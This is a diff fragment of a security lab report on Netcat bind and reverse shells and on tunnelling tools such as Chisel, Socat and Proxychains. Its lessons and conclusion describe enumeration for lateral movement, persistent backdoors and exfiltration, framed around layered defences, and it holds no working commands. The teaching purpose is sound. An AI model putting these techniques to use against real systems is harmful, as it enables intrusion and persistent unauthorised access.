+7. Enumeration is Key for Lateral Movement: Commands like uname, netstat, ps, and ifconfig provide attackers with intelligence for privilege escalation and pivoting.
 
-- It was recognized that legitimate tools like Netcat could be misused as backdoor mechanisms when not properly controlled.
+8. Temporary Access Requires Persistence: Exiting shells ends access; attackers often use persistent tunnels or backdoors to maintain control.
 
-- It was concluded that host-based firewalls, application allow-listing, network segmentation, and continuous monitoring were critical defensive measures.
+9. Layered Defenses Are Essential: Reliance solely on firewalls is insufficient—combining monitoring, logging, endpoint protection, egress control, and behavioral analytics is necessary.
 
 ## 11. Conclusion
 
-This lab demonstrated that both bind shells and reverse shells created using Netcat could result in full system compromise when adequate security controls were not in place. It was shown that attackers did not require sophisticated malware to gain access; instead, simple tools and weak configurations were sufficient.
-
-The exercise emphasized the importance of enforcing strict firewall policies that included both inbound and outbound traffic control, implementing endpoint protection, and applying system hardening practices. It was concluded that minor security oversights could lead to major security breaches, highlighting the need for proactive defensive strategies in all computing environments.
+The lab exercises demonstrated how attackers can leverage common tools like Netcat, OpenSSL, SSH, Chisel, Socat, and Proxychains to gain access, exfiltrate data, pivot through networks, and evade detection. Both simple and advanced techniques were explored, from basic bind/reverse shells to encrypted tunnels and SOCKS proxy routing. The exercises highlighted the importance of securing exposed services, enforcing strong authentication, monitoring both inbound and outbound traffic, and deploying layered defenses. Overall, the exercises reinforced that even legitimate system tools can be abused for malicious purposes, emphasizing the critical need for proactive security controls, continuous monitoring, and strict access policies to mitigate risks in real-world environments.
